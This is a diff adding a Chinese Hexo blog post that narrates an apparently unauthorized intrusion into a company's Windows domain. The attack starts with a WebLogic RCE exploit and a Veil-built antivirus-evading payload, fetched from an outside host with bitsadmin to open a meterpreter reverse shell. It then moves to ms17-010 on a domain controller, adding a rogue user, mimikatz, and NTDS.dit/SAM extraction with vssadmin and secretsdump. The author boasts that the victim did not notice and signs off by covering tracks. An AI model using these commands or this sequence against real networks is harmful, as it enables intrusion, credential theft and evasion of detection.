@@ -1,0 +1,1463 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.6" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.6">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.6">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.6">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.0.6" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.0.6',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  
+
+<meta name="description" content="无状态">
+<meta name="keywords" content="Weblogic漏洞,后门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic引发的血案-3">
+<meta property="og:url" content="OneHone.github.io/2018/04/12/Weblogic引发的血案-3/index.html">
+<meta property="og:site_name" content="Hone老帅">
+<meta property="og:description" content="无状态">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/1.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/2.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/3.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/4.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/5.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/6.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/7.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/8.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/9.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/10.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/11.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/12.PNG">
+<meta property="og:image" content="/images/Weblogic引发的血案-3/13.PNG">
+<meta property="og:updated_time" content="2018-04-13T03:22:34.458Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic引发的血案-3">
+<meta name="twitter:description" content="无状态">
+<meta name="twitter:image" content="/images/Weblogic引发的血案-3/1.PNG">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hone老帅" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="OneHone.github.io/2018/04/12/Weblogic引发的血案-3/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Weblogic引发的血案-3 | Hone老帅</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> 
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hone老帅</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+          
+  <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+</li>
+
+      
+        
+        
+          
+  <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+</li>
+
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="OneHone.github.io/2018/04/12/Weblogic引发的血案-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hone老帅">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/1.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hone老帅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Weblogic引发的血案-3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-12T15:55:48+08:00">2018-04-12</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/12/Weblogic引发的血案-3/" class="leancloud_visitors" data-flag-title="Weblogic引发的血案-3">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-thermometer-three-quarters"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				         <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>无状态<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上上篇文章一样。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;BX1</span><br><span class="line">systeminfo --&gt;Windows Server 2012 R2 Standard 169补丁</span><br><span class="line">ipconfig --&gt;192.168.2.23 </span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户属于管理员组，同时不确定管理员组里帐号（kxadmin）是不是域管</span><br><span class="line">tasklist --&gt;WRSA.exe Webroot杀软(一开始没注意到这线程，以为没杀软，绕了点弯路)</span><br><span class="line">所属域 --&gt;Kx</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Weblogic引发的血案-3/1.PNG" alt=""></p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>像开始说的，我是没有注意到<code>WRSA.exe</code>这款杀软，但是习惯性的用了<code>Veil生成msf的exp</code>，恰好又能过（virustotal.com）<br><img src="/images/Weblogic引发的血案-3/2.PNG" alt=""><br>利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/Weblogic引发的血案-3/3.PNG" alt=""><br><code>msf</code>监听并反弹<code>meterpreter的shell</code><br><img src="/images/Weblogic引发的血案-3/4.PNG" alt=""><br>这里和 Weblogic引发的血案-2有点像，哈哈哈，入口点都一样。</p>
+<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>先收集一下域信息，找找域管，找找域控。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:kx 查看域控</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net group &quot;Domain Admins&quot; /domain</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain Kx.</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">xxxx                  Administrator            xxxx</span><br><span class="line">kxadmin                  xxxx                xxxx</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;nltest /dclist:Kx</span><br><span class="line">nltest /dclist:K2x</span><br><span class="line">Get list of DCs in domain &apos;Kx&apos; from &apos;\\AD1.Kx&apos;.</span><br><span class="line">    AD1.Kx [PDC]  [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD2.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD3.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line"></span><br><span class="line">说明：xxxx代表的是马赛克</span><br></pre></td></tr></table></figure>
+<p>利用<code>ping</code>命令得到域控<code>IP</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AD1.Kx --&gt;192.168.2.225 域控</span><br><span class="line">AD2.Kx --&gt;192.168.2.215 域控</span><br><span class="line">AD3.Kx --&gt;192.168.2.245 域控</span><br></pre></td></tr></table></figure></p>
+<p>该机子的管理员组可能存在有域管账号，如果能抓出哈希岂不是美滋滋？但是当前权限不是<code>NT AUTHORITY\SYSTEM</code>所以<code>msf加载的mimikatz是抓不出哈希的</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net localgroup administrators</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\kxadmin（可能是域管账号）</span><br><span class="line">说明：这里不能说Administrator用户为域管，因为本机默认有个adminstrator,域控默认也有1个，但这两个并不是同一个。</span><br></pre></td></tr></table></figure></p>
+<p>提权啊</p>
+<h4 id="迷惑点"><a href="#迷惑点" class="headerlink" title="迷惑点"></a>迷惑点</h4><p>综合上述，这里有个问题就是判断域管的时候留下的，就是执行<code>net localgroup administrators</code>显示有<code>kx\kxadmin</code>管理员用户，然后执行<code>net group &quot;domain admins&quot; /domain</code>查看域管当中也有<code>kxadmin</code>用户，这是kx\kxadmin迷惑了我（kx是域控），注意这个账号的格式是域控\账号，这里和远程登入域机器的时候输入域管账号一样，格式也是域控\账号。所以这里的<code>kx\admin</code>账号是域管的概率很大，因为它标识了。总的来说，验证的方法也很简单，就是读取<code>kx\kxadmin</code>的密码，能登入域控的话就是域管账号了。</p>
+<h3 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h3><p>好久没有提权了，记得上次用<code>pr.exe</code>提了台机子还是半年前的事。</p>
+<h4 id="Windows-Exploit-Suggester（提权辅助工具）"><a href="#Windows-Exploit-Suggester（提权辅助工具）" class="headerlink" title="Windows-Exploit-Suggester（提权辅助工具）"></a>Windows-Exploit-Suggester（提权辅助工具）</h4><p>在目标价执行systeminfo&gt;1.txt，然后将1.txt拖回本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2018-04-10-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/Weblogic引发的血案-3/5.PNG" alt=""><br>这里只截取了一小部分的图，绿色代表可以利用的提权工具，<a href="http://www.freebuf.com/sectool/102139.html" target="_blank" rel="noopener">参考文章</a></p>
+<h4 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h4><p>运行<code>ms15-051.exe</code>结果懵逼了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;ms15-051.exe &quot;net user admin1 Qqaazz7</span><br><span class="line">41/add&quot;</span><br><span class="line">ms15-051.exe &quot;net user admin1 Qqaazz741/add&quot;</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;dir</span><br><span class="line"></span><br><span class="line"> Directory of C:\Oracle\Middleware\user_projects\domains\bifoundation_domain</span><br><span class="line"></span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          .</span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          ..</span><br><span class="line">11/10/2017  09:34 AM               144 edit.lok</span><br><span class="line">07/23/2016  08:17 PM               506 fileRealm.properties</span><br><span class="line">07/23/2016  08:17 PM    &lt;DIR&gt;          init-info</span><br><span class="line"></span><br><span class="line">emmmmm运行完之后，提权工具没了？！</span><br></pre></td></tr></table></figure></p>
+<p>当时第一反应就是被杀了，再一次看了进程才发现有个<code>WRSA.exe</code>杀软，好吧，第一次遇到，没注意。<br><img src="/images/Weblogic引发的血案-3/6.PNG" alt=""><br>Webroot杀软<br><img src="/images/Weblogic引发的血案-3/7.PNG" alt=""><br>手上也没有免杀的提权工具，这就很难受了。</p>
+<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><p>用<code>msf</code>自带的试试，<code>search了几个15 16的提权模块，设置session之后 run！</code>然而并没有用，meterpreter<code>迁移进程</code>和<code>getsystem</code>也不管用<br>提权难啊提权难</p>
+<h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>还在为提权想办法时，扫内网发现了192.168.2.245域控存在ms17-010！这次你还不死。<br><img src="/images/Weblogic引发的血案-3/8.PNG" alt=""><br>添加用户怼！<br><img src="/images/Weblogic引发的血案-3/9.PNG" alt=""></p>
+<h3 id="远程登入"><a href="#远程登入" class="headerlink" title="远程登入"></a>远程登入</h3><p><img src="/images/Weblogic引发的血案-3/10.PNG" alt=""><br>迫不得已的时候才用这招，当时登入的时候还被挤下线了，好采对方没发觉什么。</p>
+<h3 id="mimiktaz"><a href="#mimiktaz" class="headerlink" title="mimiktaz"></a>mimiktaz</h3><p><img src="/images/Weblogic引发的血案-3/11.PNG" alt=""><br>不是明文的，cmd5可破。</p>
+<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>利用该域控上线个<code>cs</code>然后<code>arp</code>登入一波域内机子就差不多完事了，但是死活上线不了，各种姿势都试过了，就是不给你上线，<code>exp</code>在进程里面了就是不给你上线（能通外网），刚开始以为是该域控环境有问题，所以就拿着域管登入到其他两个域控，还是不给上线，行吧，我在换多几台试试总可以了吧？换了不下十台机子，就是不给你上线，好气。最后以为是自己的<code>Cobalt Strike</code>有问题，本地运行下<code>exp</code>结果秒上线，狗噢。</p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>都说<code>Cobalt Strike</code>是<code>msf</code>的界面版，那我改用<code>msf</code>总行吧。<br>添加<code>msf</code>路由，使得<code>msf</code>能访问到目标内网，<a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">参考文章</a><br><img src="/images/Weblogic引发的血案-3/12.PNG" alt=""><br>登入域里的机器，使用到的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure></p>
+<p>设置对应的<code>SMBDomain，SMBUer，SMBPass</code>，run登入。结果三台域控没上线，只上线了两台，当时忘截图了，心累。</p>
+<h2 id="NTDS-dit文件"><a href="#NTDS-dit文件" class="headerlink" title="NTDS.dit文件"></a>NTDS.dit文件</h2><p>获取NTDS.dit文件，导出域控里全部域用户哈希。导出方式<a href="http://www.mottoin.com/90278.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;vssadmin create shadow /for=c:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy for &apos;c:\&apos;</span><br><span class="line">    Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;vssadmin list shadows</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Contents of shadow copy set ID: &#123;56512710-bc51-4ba7-98cc-4d1c5d7b75ae&#125;</span><br><span class="line">   Contained 1 shadow copies at creation time: 4/12/2018 2:07:02 AM</span><br><span class="line">      Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">         Original Volume: (C:)\\?\Volume&#123;aececd34-32d8-4d4f-9dc6-184ea98a825f&#125;\</span><br><span class="line">         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line">         Originating Machine: AD3.Kx</span><br><span class="line">         Service Machine: AD3.Kx</span><br><span class="line">         Provider: &apos;Microsoft Software Shadow Copy provider 1.0&apos;</span><br><span class="line">         Type: ClientAccessible</span><br><span class="line">         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\NTDS.dit c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\system c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\sam c:\</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure></p>
+<p>将<code>NTDS.dit，system，sam</code> 三个文件拖回<code>kali</code>里，<code>DUMP NTDS.dit文件</code><a href="http://www.freebuf.com/articles/system/151463.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL</span><br></pre></td></tr></table></figure></p>
+<p>说明：这里一定要在/root/下创建<code>ntds_cracking</code>目录然后将<code>ntds.dit</code>放到该目录，路径是/root/ntds_cracking/ntds.dit 不然会报错。<br><img src="/images/Weblogic引发的血案-3/13.PNG" alt=""><br>这已经是第三章了，过不了多久会出第四第五章，也有可能第四章是终章，很多技术都没用到，比如<code>MS14-068</code>漏洞，假令牌，金票据，如何猥琐得到域管账号，从工作组到域渗透，很多很多，接下来的日子在慢慢写，当然了，这也是学习技术的过程。<br>老规矩，擦屁股走人~</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Weblogic漏洞/" rel="tag"># Weblogic漏洞</a>
+          
+            <a href="/tags/后门/" rel="tag"># 后门</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/03/Weblogic引发的血案-2/" rel="next" title="Weblogic引发的血案-2">
+                <i class="fa fa-chevron-left"></i> Weblogic引发的血案-2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/15/net view命令 6118报错/" rel="prev" title=" net view命令 6118报错 ">
+                 net view命令 6118报错  <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDg3OS8xMTQxNg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/1.png"
+                alt="Hone老帅" />
+            
+              <p class="site-author-name" itemprop="name">Hone老帅</p>
+              <p class="site-description motion-element" itemprop="description">我的征途，是星辰大海！</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/OneHone" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=H0ne@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://blog.csdn.net/qq_36512966" target="_blank" title="CSDN"><i class="fa fa-fw fa-bell"></i>CSDN</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-bullhorn"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rcoil.me/" title="RcoIl" target="_blank">RcoIl</a>
+                  </li>
+                
